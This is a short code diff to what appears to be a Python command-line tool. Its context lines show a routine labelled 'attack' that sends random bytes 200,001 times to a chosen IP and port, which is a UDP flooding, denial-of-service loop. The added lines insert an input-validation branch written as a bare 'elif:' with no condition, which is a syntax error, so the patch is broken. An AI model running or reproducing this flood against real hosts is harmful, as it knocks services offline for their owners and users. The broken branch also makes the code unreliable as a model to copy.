@@ -75,8 +75,10 @@ class Main(cmd.Cmd):
 			self.true_to_attack() # attack
 		elif chose == 'n' or chose == 'N':
 			self.exit()
-		
-		
+		elif:
+			print('请规范输入')
+			self.attack()
+			
 	def true_to_attack_attack(self):
 		for i in range(200001):
 			so.sendto(randbyte,(self.ip,self.port))
